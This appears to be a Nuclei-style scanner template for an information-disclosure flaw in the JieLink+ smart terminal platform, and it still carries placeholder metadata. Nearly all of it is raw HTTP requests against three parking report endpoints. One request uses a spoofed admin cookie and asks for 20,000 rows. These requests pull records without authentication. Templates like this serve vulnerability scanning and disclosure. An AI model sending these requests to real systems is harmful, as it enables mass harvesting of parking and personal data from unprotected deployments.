id: JieLink-other-weak2
info:
  name: Template Name
  author: wangzong
  severity: high
  description: JieLink+智能终端操作平台多个接口处存在敏感信息泄露漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /report/ParkChargeRecord/GetDataList HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
        Accept: application/json, text/javascript, \*/\*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Authorization: Bearer test
        Cookie: JSESSIONID=test;UUID=1; userid=admin
        X-Requested-With: XMLHttpRequest
        Content-Length: 17
        Origin: http://{{Hostname}}
        Referer: http://{{Hostname}}/Report/ParkOutRecord/Index
        Sec-Gpc: 1
        Priority: u=1

        page=1&rows=20000
      - |+
        GET /Report/ParkCommon/GetParkInThroughDeivces HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
        Accept: application/json, text/javascript, \*/\*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        X-Requested-With: XMLHttpRequest
        Connection: close
        Sec-Gpc: 1

      - |+
        GET /report/ParkOutRecord/GetDataList HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
        Accept: application/json, text/javascript, \*/\*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        X-Requested-With: XMLHttpRequest
        Connection: close
        Sec-Gpc: 1

    matchers:
      - type: word
        part: header
        words:
          - '200'
